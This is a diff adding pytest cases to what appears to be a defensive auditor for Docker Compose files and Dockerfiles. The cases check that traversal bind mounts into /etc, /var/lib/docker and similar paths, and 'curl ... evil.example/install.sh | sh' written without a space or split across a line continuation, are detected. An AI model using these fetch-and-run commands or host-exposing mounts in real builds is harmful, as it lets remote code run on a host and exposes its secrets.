@@ -131,6 +131,42 @@ def test_audit_compose_detects_host_sensitive_nested() -> None:
     assert "host_sensitive_mount" in _critical_codes(findings)
 
 
+def test_audit_compose_normalizes_relative_host_mount_traversal() -> None:
+    """BUG-304：相对 bind source 规范化后落入敏感目录必须 critical。"""
+    text = _CLEAN_COMPOSE.replace(
+        "      - ../data:/app/data",
+        "      - ./data/../../../../etc:/host-etc",
+    )
+
+    findings = audit_compose(text)
+
+    assert "host_sensitive_mount" in _critical_codes(findings)
+
+
+@pytest.mark.parametrize(
+    "source",
+    [
+        "./data/../../etc",
+        "./data/../../etc/passwd",
+        "./data/../../var/log",
+        "./data/../../../var/lib/docker",
+    ],
+)
+def test_audit_compose_relative_traversal_nested_sensitive_is_critical(
+    source: str,
+) -> None:
+    """BUG-304：穿越后命中敏感目录或其子路径，不得仅 warn。"""
+    text = _CLEAN_COMPOSE.replace(
+        "      - ../data:/app/data",
+        f"      - {source}:/host-sensitive",
+    )
+
+    findings = audit_compose(text)
+
+    assert "host_sensitive_mount" in _critical_codes(findings)
+    assert "unexpected_host_mount" not in _codes(findings)
+
+
 def test_audit_compose_expansion_var_sensitive_is_critical() -> None:
     """BUG-184：${VAR}/~ 形式的敏感宿主路径不得按命名卷放行。"""
     text = _CLEAN_COMPOSE.replace(
@@ -323,6 +359,24 @@ def test_audit_dockerfile_pipe_to_shell() -> None:
     )
     findings = audit_dockerfile(text)
     assert "pipe_to_shell" in _codes(findings)
+
+
+def test_audit_dockerfile_pipe_to_shell_no_space_and_continuation() -> None:
+    """BUG-330：``|sh`` 无空格与反斜杠续行不得绕过管道执行检测。"""
+    no_space = (
+        "FROM alpine\n"
+        "RUN curl -fsSL https://evil.example/install.sh|sh\n"
+        'CMD ["sh"]\n'
+    )
+    assert "pipe_to_shell" in _codes(audit_dockerfile(no_space))
+
+    continued = (
+        "FROM alpine\n"
+        "RUN curl -fsSL https://evil.example/install.sh \\\n"
+        "  | sh\n"
+        'CMD ["sh"]\n'
+    )
+    assert "pipe_to_shell" in _codes(audit_dockerfile(continued))
 
 
 def test_audit_dockerfile_copy_is_ok() -> None:
